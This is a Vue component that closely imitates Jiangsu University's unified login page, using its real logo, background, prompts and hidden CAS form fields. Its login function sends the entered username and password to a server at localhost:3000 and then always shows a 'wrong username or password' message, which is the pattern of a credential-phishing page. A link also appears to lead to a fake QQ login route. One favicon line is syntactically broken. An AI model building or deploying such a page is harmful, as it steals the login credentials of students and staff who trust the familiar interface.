<script setup>
import { onMounted, ref } from 'vue';
import axios from 'axios'
const passwordError = ref(false); // holds the error state of the password input field
const username = ref('')
const password = ref('')
const login = async()=>{
    console.log(username.value);
    const res = await axios.post('http://localhost:3000/',{
        username:username.value,
        password:password.value,
        'type':'normal'
    })
    console.log(res.data);
    passwordError.value=true
}
onMounted(()=>{
    document.querySelectorAll('link[rel="icon"]').forEach((e) => {
        e.setAttribute("href", );
      });
})
</script>
<template>
    <div class="container">
        <div class="auth-language">
            <div class="switchingbox auth-language-select">
                <span class="iconfont" style="margin-right: 5px;"></span>
                <span style="margin-right: 10px;" class="language_text">English</span>
            </div>
        </div>
        <div class="headerbg">
            <div class="headerbox">
                <div class="auth_logo" style="display: flex;">
                    <img src="https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/logo3.png?vpn-1"
                        alt="logo">
                </div>
            </div>
        </div>
        <div class="auth_page_wrapper">
            <div class="auth_logo" style="display:none;">
            </div>
            <div class="auth_login_content">
                <div class="auth_login_left">
                    <div class="auth_others" style="display:none;">
                        <h4>您还可以使用以下方式登录</h4>
                        <ul>
                            <li>
                                <a href="combinedLogin.do?type=qq&amp;success=https%3A%2F%2Fpass.ujs.edu.cn%2Fcas%2Flogin%3Fservice%3Dhttps%253A%252F%252Fwebvpn.ujs.edu.cn%252Flogin%253Fcas_login%253Dtrue"
                                    style="display: inline-block;">
                                    <span class="auth_icon_bg">
                                        <i class="auth_icon_qq"></i>
                                    </span>
                                    <span class="auth_icon_text">使用腾讯QQ登录</span>
                                </a>
                            </li>
                            <li>
                                <a href="combinedLogin.do?type=weixin&amp;success=https%3A%2F%2Fpass.ujs.edu.cn%2Fcas%2Flogin%3Fservice%3Dhttps%253A%252F%252Fwebvpn.ujs.edu.cn%252Flogin%253Fcas_login%253Dtrue"
                                    style="display: inline-block;">
                                    <span class="auth_icon_bg">
                                        <i class="auth_icon_weixin"></i>
                                    </span>
                                    <span class="auth_icon_text">使用微信登录</span>
                                </a>
                            </li>
                            <li>
                                <a href="combinedLogin.do?type=qrcode&amp;success=https%3A%2F%2Fpass.ujs.edu.cn%2Fcas%2Flogin%3Fservice%3Dhttps%253A%252F%252Fwebvpn.ujs.edu.cn%252Flogin%253Fcas_login%253Dtrue"
                                    style="display: inline-block;">
                                    <span class="auth_icon_bg">
                                        <i class="auth_icon_qrcode"></i>
                                    </span>
                                    <span class="auth_icon_text">使用二维码登录</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="auth_login_right">
                    <div class="auth_tab">
                        <!-- 滑块验证码：-->
                        <meta name="renderer" content="webkit">
                        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                        <meta content="width=device-width,initial-scale=0.8, minimum-scale=0.8, maximum-scale=3"
                            name="viewport">
                        <meta name="renderer" content="webkit">
                        <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">
                        <meta property="qc:admins" content="754034015366713545637571540352652">
                        <meta property="wb:webmaster" content="1ad39047f32b5b6b">
                        <title>统一身份认证</title>
                        <div class="container-fluid slidercaptcha-fluid" id="captcha-id"
                            style="display: none;position: fixed;z-index: 999; width: 350px; height: 300px; ">
                            <div class="form-row">
                                <div class="col-12">
                                    <div class="slidercaptcha card">
                                        <div class="card-header">
                                            <span>请完成安全验证</span>
                                        </div>
                                        <div class="card-body">
                                            <div id="captcha" style="position: relative; width: 280px; margin: 0px auto;">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <img id="img1" src="" style="display: none;">
                            <img id="img2" src="" style="display: none;">
                            <input type="hidden" id="loadingText" value="向右滑动填充拼图">
                            <input type="hidden" id="failedText" value="再试一次">
                        </div>
                        <div class="auth_tab_links">
                            <ul>
                                <li id="accountLogin" style="width:113px;" class="selected" tabid="01"><span>账号登录</span>
                                </li>
                                <li style="width:113px;" id="dyLogin" tabid="02" class=""><i></i><span>短信登录</span></li>
                                <li style="width:113px;" id="qrLogin" tabid="03" class="qrLogin"><i></i><span>扫码登录</span>
                                </li>
                            </ul>
                        </div>
                        <div class="clearfloat"></div>
                        <div class="auth_tab_content" style="min-height: 280px;">
                            <div tabid="01" class="auth_tab_content_item" style="display: block;">
                                <form id="casLoginForm" class="fm-v clearfix amp-login-form" role="form"
                                    action="/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/login?service=https%3A%2F%2Fwebvpn.ujs.edu.cn%2Flogin%3Fcas_login%3Dtrue"
                                    method="post"
                                    >
                                    <span id="msg" :class="['auth_error',passwordError?'open':'close']" style="top:-19px;">您提供的用户名或者密码有误</span>
                                    <p>
                                        <i class="auth_icon auth_icon_user"></i>
                                        <input id="username" name="username" placeholder="一卡通号" class="auth_input"
                                            type="text" v-model="username">
                                        <span id="usernameError" style="display:none;" class="auth_error">请输入用户名</span>
                                    </p>
                                    <p>
                                        <i class="auth_icon auth_icon_pwd"></i>
                                        <input id="password" placeholder="密码" class="auth_input" type="password" v-model="password"
                                            autocomplete="off">
                                        <input id="passwordEncrypt" name="password" style="display:none;" type="text"
                                            value="">
                                        <span id="passwordError" style="display:none;" class="auth_error">请输入密码</span>
                                    </p>
                                    <p id="cpatchaDiv">
                                    </p>
                                    <a id="getBackPasswordMainPage"
                                        href="getBackPasswordMainPage.do?service=https%3A%2F%2Fwebvpn.ujs.edu.cn%2Flogin%3Fcas_login%3Dtrue"
                                        class="auth_login_forgetp">
                                        <small>忘记密码？</small>
                                    </a>
                                    <p>
                                        <button @click="login" type="button"
                                            class="auth_login_btn primary full_width">登录
                                        </button>
                                    </p>
                                    <div class="import-tit chinese_type" style="text-align: left;">
                                        <h2>温馨提示：</h2>
                                        <span>首次登录密码为“身份证后六位”（不包含'X'），留学生为“护照号后六位”</span>
                                    </div>
                                    <div class="import-tit english_type" style="display: none;">
                                        <h2>Warm prompt:</h2>
                                        <span>The initial password of the new overseas student is "the last six digits of
                                            the passport"</span>
                                        <span>Service Phone:88780360</span>
                                    </div>
                                    <div class="other-login-way">
                                        <div class="box-line-tit">
                                            <span class="chinese_type">您还可以使用以下方式登录</span>
                                            <span class="english_type" style="display: none;">Or the following</span>
                                        </div>
                                        <div class="login-way-bd">
                                            <div class="way-item">
                                                <a href="/#/qq"
                                                    class="item" target="_self">
                                                    <i class="qqway-icon"></i>
                                                </a>
                                            </div>
                                            <div class="way-item">
                                                <i class="wxway-icon"></i>
                                            </div>
                                        </div>
                                    </div>
                                    <input type="hidden" name="lt"
                                        value="LT-681449-lXP4fuu0edZUG79eOlJN9riS1435cB1685957532420-qScX-cas">
                                    <input type="hidden" name="dllt" value="userNamePasswordLogin">
                                    <input type="hidden" name="execution" value="e3s1">
                                    <input type="hidden" name="_eventId" value="submit">
                                    <input type="hidden" name="rmShown" value="1">
                                    <input type="hidden" id="pwdDefaultEncryptSalt" value="fezwDTbxRBmmDZLU">
                                </form>
                            </div>
                            <input type="hidden" id="isSliderCaptcha" value="true">
                            <input type="hidden" id="sliderCaptchaDynamicCode" value="">
                            <div tabid="02" class="auth_tab_content_item" style="display: none;">
                                <form id="casDynamicLoginForm" class="fm-v clearfix amp-login-form"
                                    action="/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/login?service=https%3A%2F%2Fwebvpn.ujs.edu.cn%2Flogin%3Fcas_login%3Dtrue"
                                    method="post">
                                    <p>
                                        <i class="auth_icon auth_icon_user"></i>
                                        <input id="username" name="username" placeholder="手机号"
                                            class="auth_input userNameText" type="text" value="">
                                        <span id="dynamicNameError" style="display:none;" class="auth_error">请输入用户名</span>
                                    </p>
                                    <p>
                                        <i class="auth_icon auth_icon_pwd"></i>
                                        <input type="text" class="auth_input" id="dynamicCode" name="dynamicCode"
                                            placeholder="短信验证码" style="width:95px;">
                                        <input type="button" id="getDynamicCode" value="获取验证码"
                                            class="auth_login_btn warning abs_right dynamicCode">
                                        <span id="dynamicCodeError" style="display:none;" class="auth_error">请输入短信验证码</span>
                                    </p>
                                    <p style="min-height: 25px;margin-bottom: 15px;">
                                        <span id="sendCodeWarnMessage"
                                            style="font-size: 12px;color: rgb(230, 142, 142);margin: 14px;"></span>
                                    </p>
                                    <p style="margin-bottom: 34px;margin-bottom: 37px\9;">
                                        <button
                                            onclick="var vpn_return;eval(vpn_rewrite_js((function () { submitDynamicForm(event) }).toString().slice(14, -2), 2));return vpn_return;"
                                            class="auth_login_btn primary full_width">
                                            登录
                                        </button>
                                    </p>
                                    <input type="hidden" name="lt"
                                        value="LT-681449-lXP4fuu0edZUG79eOlJN9riS1435cB1685957532420-qScX-cas">
                                    <input type="hidden" name="dllt" value="dynamicLogin">
                                    <input type="hidden" name="execution" value="e3s1">
                                    <input type="hidden" name="_eventId" value="submit">
                                    <input type="hidden" name="rmShown" value="1">
                                    <input type="hidden" id="dynamicPwdEncryptSalt" value="RQ0IbHDSl7KptIGY">
                                </form>
                            </div>
                            <div tabid="03" class="auth_tab_content_item" style="display: none;">
                                <meta name="renderer" content="webkit">
                                <meta charset="utf-8">
                                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                                <meta name="renderer" content="webkit">
                                <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE11">
                                <meta name="viewport"
                                    content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"
                                    charset="UTF-8">
                                <title>扫码登录</title>
                                <!--[if IE 8]>
    <style>
        .qr_scan_box {
            margin: 0;
            background: #E3E3E3;
        }
    </style>
    <![endif]-->
                                <form id="qrLoginForm" role="form"
                                    action="/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/login?service=https%3A%2F%2Fwebvpn.ujs.edu.cn%2Flogin%3Fcas_login%3Dtrue"
                                    method="post">
                                    <div id="qr_code" class="login--scan_box--scan">
                                        <div class="login--scan_pic scan_code_pic">
                                            <img id="qr_img"
                                                src="/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/qrCode/code?uuid=QR-AtNsTcTxcD7EuQSb9vq"
                                                width="186">
                                            <div class="code-reminder chinese_type">扫二维码登录校园门户</div>
                                            <div class="code-reminder english_type" style="display: none;">Scanning the qr
                                                code to login the campus portal</div>
                                            <div class="reminderbox">
                                                <p class="reminder-tit chinese_type">温馨提示：</p>
                                                <p class="reminder-tit english_type" style="display: none;">Warm prompt:</p>
                                                <p class="reminder-conent chinese_type">
                                                    扫码登录前请先关注<a
                                                        href="https://webvpn.ujs.edu.cn/http/77726476706e69737468656265737421e7e056d2323a7b1e7b0c9ce29b5b/info/1180/18965.htm"
                                                        target="_blank">“江苏大学企业微信号”</a>
                                                </p>
                                                <p class="reminder-conent english_type" style="display: none;">
                                                    Please follow the <a
                                                        href="https://webvpn.ujs.edu.cn/http/77726476706e69737468656265737421e7e056d2323a7b1e7b0c9ce29b5b/info/1180/18965.htm"
                                                        target="_blank">Enterprise wechat account of UJS</a> before scanning
                                                    the qr code
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                    <input type="hidden" name="lt"
                                        value="LT-681449-lXP4fuu0edZUG79eOlJN9riS1435cB1685957532420-qScX-cas">
                                    <input type="hidden" name="uuid" id="uuid" value="QR-AtNsTcTxcD7EuQSb9vq">
                                    <input type="hidden" name="dllt" value="qrLogin">
                                    <input type="hidden" name="execution" value="e3s1">
                                    <input type="hidden" name="_eventId" value="submit">
                                    <input type="hidden" name="rmShown" value="1">
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="hidenCaptchaDiv" style="display: none;">
                <i class="auth_icon auth_icon_bar"></i>
                <input type="text" placeholder="验证码" id="captchaResponse" name="captchaResponse"
                    class="auth_input captcha-input">
                <img id="captchaImg" class="captcha-img" alt="验证码" title="验证码">
                <span style="cursor: pointer;color: #1dadff;margin-left: 2px;" id="changeCaptcha" class="chk_text"></span>
                <span id="cpatchaError" style="display:none;" class="auth_error">请输入验证码</span>
            </div>
            <div class="clearfloat"></div>
            <div class="auth_login_footer">
                <span>
                    Copyright&nbsp;©&nbsp;2022江苏大学
                </span>
            </div>
        </div>
        <div style="position: fixed; z-index: 10000; height: 30px; bottom: 0px; right: 0px; padding: 0px 10px; background-color: rgba(255, 255, 255, 0.5);"><div style="pointer-events: none; font-size: 14px; line-height: 30px; color: rgb(0, 153, 204);">您正在使用VPN</div></div>
        <div style="position: fixed; z-index: 10000; bottom: 30px; right: 0px; padding: 0px 10px; background-color: rgba(255, 255, 255, 0.5);"><div title="点击收藏" style="padding: 5px; font-size: 0px;"><svg style="width:20px;height:20px" t="1665216096260" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="6085" width="20" height="20">
    <path d="M908.1 353.1l-253.9-36.9L540.7 86.1c-3.1-6.3-8.2-11.4-14.5-14.5-15.8-7.8-35-1.3-42.9 14.5L369.8 316.2l-253.9 36.9c-7 1-13.4 4.3-18.3 9.3-12.3 12.7-12.1 32.9 0.6 45.3l183.7 179.1-43.4 252.9c-1.2 6.9-0.1 14.1 3.2 20.3 8.2 15.6 27.6 21.7 43.2 13.4L512 754l227.1 119.4c6.2 3.3 13.4 4.4 20.3 3.2 17.4-3 29.1-19.5 26.1-36.9l-43.4-252.9 183.7-179.1c5-4.9 8.3-11.3 9.3-18.3 2.7-17.5-9.5-33.7-27-36.3zM664.8 561.6l36.1 210.3L512 672.7 323.1 772l36.1-210.3-152.8-149L417.6 382 512 190.7 606.4 382l211.2 30.7-152.8 148.9z" p-id="6086" fill="#bfbfbf">
    </path></svg></div><div title="您正在使用VPN" style="padding: 5px; font-size: 0px;"><svg style="width:20px;height:20px" t="1665219079891" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10115" width="20" height="20">
    <path d="M888.49 222.686v-31.54l-65.672-0.955h-0.205a465.715 465.715 0 0 1-144.315-31.334c-77.005-31.198-126.294-66.765-126.703-67.107l-39.8-28.672-39.185 28.468c-2.048 1.501-49.903 36.044-126.908 67.31a447.42 447.42 0 0 1-144.52 31.335l-65.877 0.956v378.88c0 87.04 49.834 184.661 137.01 267.81 37.547 35.84 79.258 66.355 120.833 88.2 43.28 22.733 84.24 34.612 118.852 34.612 34.406 0 75.776-12.152 119.603-35.158a547.977 547.977 0 0 0 120.013-87.654 515.209 515.209 0 0 0 96.188-122.88c27.102-49.562 40.823-98.304 40.823-144.999l-0.136-347.204zM510.09 143.428l1.706-1.365 1.775 1.365c5.803 4.165 59.529 41.848 140.356 74.752 79.19 32.086 153.6 35.635 167.663 36.045l2.594 0.068 0.205 315.734c0.137 69.495-42.598 150.186-117.077 221.457C641.57 854.289 563.13 896.478 512 896.478c-23.689 0-55.57-9.899-89.702-27.785a478.822 478.822 0 0 1-105.609-77.278C242.21 720.213 199.475 639.522 199.475 569.89V254.225l2.73-0.136c3.278 0 82.604-1.502 167.664-35.977a739.942 739.942 0 0 0 140.22-74.615v-0.069z" p-id="10116" fill="#1890ff"></path><path d="M713.318 368.64a32.222 32.222 0 0 0-45.329 0L449.195 587.435l-93.184-93.116a32.222 32.222 0 0 0-45.33 0 32.222 32.222 0 0 0 0 45.26l115.85 115.85a32.29 32.29 0 0 0 45.328 0L713.32 413.9a32.222 32.222 0 0 0 0-45.33z" p-id="10117" fill="#1890ff"></path></svg></div></div>
    </div>
</template>
<style scoped>
.open {
    display: block;
}
.close {
    display: none;
}
.container {
    width: 100vw;
    height: 100vh;
    background-image: url(https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/login-bg-autumn.jpg);
    background-repeat: no-repeat;
    background-size: cover;
}
.auth_bg {
    position: fixed;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    z-index: -1;
}
.auth_bg img {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    margin: auto;
    min-width: 50%;
    min-height: 50%;
}
.auth_page_wrapper {
    width: 960px;
    margin: 20px auto;
    padding: 0;
    font-family: 'Microsoft YaHei';
    font-size: 13px;
    color: #676A6C;
}
.auth_login_content {
    margin-top: 100px;
    height: 400px;
}
.auth_login_content .auth_login_left {
    width: 50%;
    height: 287px;
    float: left;
    position: relative;
}
.auth_login_left .auth_others {
    position: absolute;
    left: 130px;
    bottom: 0;
}
.auth_login_left .auth_others a .auth_icon_bg {
    float: left;
    height: 34px;
    background-color: rgba(255, 255, 255, .8);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#C8ffffff, endColorstr=#C8ffffff);
}
.auth_login_left .auth_others a .auth_icon_bg:hover {
    background-color: #ffffff;
}
.auth_login_left .auth_others a i {
    width: 34px;
    height: 34px;
    display: inline-block;
}
.auth_icon_qq {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") 8px -102px no-repeat;
}
.auth_icon_weibo {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") -20px -102px no-repeat;
}
.auth_icon_weixin {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") -50px -102px no-repeat;
}
.auth_icon_alliance {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/alliance.png") no-repeat;
}
.auth_icon_IDSUnion {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/IDSUnion.png") no-repeat;
}
.auth_icon_qrcode {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/qrcode.png") 8px no-repeat;
}
.auth_icon_user {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") 6px -73px no-repeat;
}
.auth_icon_pwd {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") -19px -73px no-repeat;
}
.auth_icon_bar {
    background: url("https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/icons.png") -43px -73px no-repeat;
}
.auth_login_content .auth_login_right {
    width: 50%;
    float: right;
}
.auth_login_left .auth_others h4 {
    font-size: 16px;
    color: #fff;
    padding-bottom: 5px;
    font-weight: 600;
}
.auth_login_left .auth_others ul,
.auth_tab_links ul {
    list-style: none;
    margin: 0;
    padding: 0;
}
.auth_login_left .auth_others li {
    margin-top: 15px;
    height: 34px;
    line-height: 34px;
}
.auth_login_left .auth_others li a {
    text-decoration: none;
}
.auth_login_left .auth_others .auth_icon_text {
    width: 225px;
    padding-left: 15px;
    color: #fff;
    font-size: 13px;
    background-color: rgba(255, 255, 255, .4);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#66ffffff, endColorstr=#66ffffff);
    display: inline-block;
}
.auth_login_left .auth_others .auth_icon_text:hover {
    background-color: rgba(255, 255, 255, .6);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#99ffffff, endColorstr=#99ffffff);
}
.auth_tab {
    width: 339px;
    margin-left: 125px;
}
.auth_tab_links li {
    width: 50%;
    height: 35px;
    line-height: 35px;
    text-align: center;
    display: block;
    float: left;
    background-color: rgba(138, 138, 137, .8);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#998A8A89, endColorstr=#998A8A89);
    cursor: pointer;
}
.auth_tab_links li span {
    color: #ffffff;
}
.auth_tab_links li.selected {
    background-color: rgba(255, 255, 255, .9);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#E5ffffff, endColorstr=#E5ffffff);
}
.auth_tab_links li.selected span {
    color: #676a6c;
}
.auth_tab_content {
    padding: 25px 35px 22px 35px;
    background-color: rgba(255, 255, 255, .9);
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#E5ffffff, endColorstr=#E5ffffff);
    min-height: 205px;
}
.auth_tab_content_item {
    position: relative;
}
.auth_tab_content_item p {
    margin-top: 0;
    margin-bottom: 17px;
}
.auth_tab_content_item p label {
    font-size: 12px;
    margin-left: 5px;
}
.auth_icon {
    background-color: rgb(242, 242, 242);
    border: 1px solid #ccc;
    border-right: none;
    width: 32px;
    height: 32px;
    float: left;
}
.auth_input {
    border: 1px solid #ccc;
    padding: 8px 12px;
    font-size: 14px;
    width: 209px;
    margin: 0;
    color: #676a6c;
}
.auth_input:focus {
    outline: none;
}
.auth_login_btn {
    color: #fff;
    padding: 6px 12px;
    font-size: 14px;
    font-weight: 400;
    line-height: 1.42857143;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    border-radius: 3px;
    text-decoration: none;
    border: 1px solid transparent;
    width: 100%;
}
.primary {
    background-color: #1ab394;
    border-color: #1ab394;
}
.primary:hover {
    background-color: #18a689;
    border-color: #18a689;
}
.warning {
    background-color: #EBDC99;
    border-color: #EBDC99;
    color: #676a6c;
}
.warning:hover {
    background-color: #EEDA80;
    border-color: #EEDA80;
    color: #333;
}
.abs_right {
    position: absolute;
    right: 0;
}
.full_width {
    display: block;
}
.auth_login_forgetp {
    text-decoration: none;
    color: orangered;
    padding-bottom: 10px;
}
.auth_login_forgetp:hover {
    color: #333;
}
.auth_login_forgetp small {
    font-size: 12px;
}
.auth_error {
    position: absolute;
    color: #ED5565;
    font-size: 12px;
    top: 33px;
    left: 45px;
}
.clearfloat {
    clear: both;
}
.auth_login_footer {
    width: 100%;
    margin-top: 100px;
    text-align: center;
}
.auth_login_footer span {
    color: #f3f3f3;
    font-size: 12px;
}
.captcha-img {
    width: 92px;
    height: 34px;
    margin-left: 3px;
    vertical-align: top;
}
.captcha-input {
    width: 65px;
}
.dynamicCode {
    width: 90px;
    padding: 6px 8px;
    margin-top: 0px;
    cursor: pointer;
    font-family: 'Microsoft YaHei';
}
.login-ul-li-full {
    width: 100% !important;
}
/*二维码样式*/
#qrCodeImage {
    padding: 2px;
    border: 1px solid #CCC;
    background: #fff;
    box-shadow: 0 0 5px rgba(0, 0, 0, .3)
}
.qrCenter {
    text-align: center;
}
#appCodeRefresh {
    position: absolute;
    top: 0;
    left: 76px;
    width: 117px;
    height: 118px;
    cursor: pointer;
}
.appCode-mask {
    height: 100%;
    background: #000;
    opacity: 0.7;
    filter: alpha(opacity=70);
}
#appCodeLoginLoad {
    position: absolute;
    top: 0;
    left: 76px;
    width: 117px;
    height: 118px;
}
.appCode-wrap {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    padding-top: 44px;
    text-align: center;
    color: #fff;
    line-height: 26px;
}
.appCode-wrap {
    text-align: center;
    color: #fff;
    line-height: 26px;
}
.auth-language {
    float: right;
    margin-top: 18px;
    font-size: 14px;
    margin-right: 15px;
}
.auth-language-select {
    float: right;
    padding-left: 16px;
}
/* iCheck plugin Square skin, green
----------------------------------- */
.icheckbox_square-green,
.iradio_square-green {
    display: inline-block;
    *display: inline;
    vertical-align: middle;
    margin: 0;
    padding: 0;
    width: 22px;
    height: 22px;
    background: url(green.png) no-repeat;
    border: none;
    cursor: pointer;
}
.icheckbox_square-green {
    background-position: 0 0;
}
.icheckbox_square-green.hover {
    background-position: -24px 0;
}
.icheckbox_square-green.checked {
    background-position: -48px 0;
}
.icheckbox_square-green.disabled {
    background-position: -72px 0;
    cursor: default;
}
.icheckbox_square-green.checked.disabled {
    background-position: -96px 0;
}
.iradio_square-green {
    background-position: -120px 0;
}
.iradio_square-green.hover {
    background-position: -144px 0;
}
.iradio_square-green.checked {
    background-position: -168px 0;
}
.iradio_square-green.disabled {
    background-position: -192px 0;
    cursor: default;
}
.iradio_square-green.checked.disabled {
    background-position: -216px 0;
}
/* HiDPI support */
@media (-o-min-device-pixel-ratio: 5/4),
(-webkit-min-device-pixel-ratio: 1.25),
(min-resolution: 120dpi) {
    .icheckbox_square-green,
    .iradio_square-green {
        background-image: url(green@2x.png);
        -webkit-background-size: 240px 24px;
        background-size: 240px 24px;
    }
}
/*定制代码*/
.switchingbox {
    box-sizing: border-box;
    border: 1px solid #fff;
    border-radius: 5px;
    line-height: 38px;
    color: #fff;
    font-size: 16px;
    float: right;
    margin-top: 30px;
    cursor: pointer;
}
.switchingbox select {
    background-color: transparent;
    border: none;
    color: #fff;
    font-size: 14px;
    height: 38px;
    line-height: 38px;
}
.switchingbox .language {
    background-color: transparent;
    border: none;
    color: #fff;
    font-size: 14px;
    height: 38px;
    line-height: 38px;
    width: 60px;
    display: -webkit-inline-box;
}
.switchingbox select#language:hover {
    color: #1ab394;
    background-color: #fff;
    -o-transition: all .2s ease-in-out;
    transition: all .2s ease-in-out;
    -webkit-transition: all .2s ease-in-out;
    -moz-transition: all .2s ease-in-out;
    -ms-transition: all .2s ease-in-out;
}
.switchingbox .language:hover {
    color: #1ab394;
    background-color: #fff;
    -o-transition: all .2s ease-in-out;
    transition: all .2s ease-in-out;
    -webkit-transition: all .2s ease-in-out;
    -moz-transition: all .2s ease-in-out;
    -ms-transition: all .2s ease-in-out;
}
.switchingbox:hover {
    color: #1ab394;
    background-color: #fff;
    -o-transition: all .2s ease-in-out;
    transition: all .2s ease-in-out;
    -webkit-transition: all .2s ease-in-out;
    -moz-transition: all .2s ease-in-out;
    -ms-transition: all .2s ease-in-out;
}
.headerbox {
    width: 1200px;
    margin: 0px auto;
    padding: 20px 0px;
}
.clearfix {
    clear: both;
}
.headerbg {
    background-image: -moz-linear-gradient(-90deg, rgb(129, 200, 241) 0%, rgba(201, 219, 255, 0) 100%);
    background-image: -webkit-linear-gradient(-90deg, rgb(129, 200, 241) 0%, rgba(201, 219, 255, 0) 100%);
    background-image: -ms-linear-gradient(-90deg, rgb(129, 200, 241) 0%, rgba(201, 219, 255, 0) 100%);
}
.auth_tab_content {
    min-height: 280px;
}
.auth-language {
    float: right;
    margin-top: 22px;
    font-size: 14px;
    margin-right: 200px;
}
/*****温馨提示-扫码登录****/
body {
    -webkit-font-smoothing: antialiased;
    /*-webkit-text-stroke-width: .2px;*/
    -moz-osx-font-smoothing: grayscale;
}
.scan_code_pic .reminderbox {
    text-align: left;
}
.scan_code_pic .reminderbox .reminder-tit {
    color: #666;
    font-weight: bold;
}
.scan_code_pic .reminderbox a {
    color: #1ab394;
    cursor: pointer;
}
.scan_code_pic .reminderbox a:hover {
    color: #0f8b72;
    -o-transition: all .4s ease-in-out;
    transition: all .4s ease-in-out;
    -webkit-transition: all .4s ease-in-out;
    -moz-transition: all .4s ease-in-out;
    -ms-transition: all .4s ease-in-out;
}
.scan_code_pic .reminderbox .reminder-tit {
    margin-top: 20px;
}
.scan_code_pic .reminderbox p {
    margin-bottom: 4px;
    color: #666;
}
.scan_code_pic .code-reminder {
    margin-top: 6px;
    letter-spacing: 1px;
}
.import-tit {
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.import-tit h2 {
    font-size: 13px;
    color: #666;
    margin: 0;
    margin-bottom: 5px;
}
.import-tit span {
    font-size: 12px;
    color: #666;
    display: inline-block;
    line-height: 18px;
    margin-bottom: 4px;
}
.auth_login_forgetp {
    float: right;
}
.login-way-bd .qqway-icon {
    background: url(https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/qq.png) no-repeat;
    background-size: cover;
    width: 28px;
    height: 28px;
    display: block;
}
.login-way-bd .wxway-icon {
    background: url(https://webvpn.ujs.edu.cn/https/77726476706e69737468656265737421e0f6528f69256243300d8db9d6562d/cas/custom/images/wx.png) no-repeat;
    background-size: cover;
    width: 28px;
    height: 28px;
    display: block;
}
.other-login-way .box-line-tit {
    font-size: 13px;
    color: #838383;
    text-align: center;
    position: relative;
}
.box-line-tit:after,
.box-line-tit:before {
    position: absolute;
    width: 16%;
    height: 0;
    content: '';
    border-top-width: 1px;
    border-top-style: solid;
    top: 10px;
    left: 0;
}
.box-line-tit:after,
.box-line-tit:before {
    border-top-color: #aaa9a9;
}
.box-line-tit:before {
    left: inherit;
    right: 0;
}
.other-login-way .login-way-bd {
    text-align: center;
    margin: 12px auto;
}
.other-login-way .login-way-bd .way-item {
    display: inline-block;
    margin: 0 6px;
    text-align: center;
}
.other-login-way .login-way-bd .way-item span {
    display: block;
    color: #28abcc;
    font-size: 14px;
}
.auth_tab_links li.selected span {
    font-size: 14px;
    text-decoration: none;
    font-weight: bold;
    color: #69696b;
}
.auth_login_content {
    margin-top: 30px;
    height: 400px;
}
.iconfont {
    font-family: "iconfont" !important;
    font-size: 16px;
    font-style: normal;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
body {
    overflow-x: hidden;
}
.block {
    position: absolute;
    left: 0;
    top: 0;
}
.sliderContainer {
    position: relative;
    text-align: center;
    line-height: 40px;
    background: #f7f9fa;
    color: #45494c;
    border-radius: 2px;
}
.sliderbg {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    background-color: #f7f9fa;
    height: 40px;
    border-radius: 2px;
    border: 1px solid #e6e8eb;
}
.sliderContainer_active .slider {
    top: -1px;
    border: 1px solid #1991FA;
}
.sliderContainer_active .sliderMask {
    border-width: 1px 0 1px 1px;
}
.sliderContainer_success .slider {
    top: -1px;
    border: 1px solid #52CCBA;
    background-color: #52CCBA !important;
}
.sliderContainer_success .sliderMask {
    border: 1px solid #52CCBA;
    border-width: 1px 0 1px 1px;
    background-color: #D2F4EF;
}
.sliderContainer_success .sliderIcon:before {
    /*content: "\f00c";*/
    content: "\2713";
}
.sliderContainer_fail .slider {
    top: -1px;
    border: 1px solid #f57a7a;
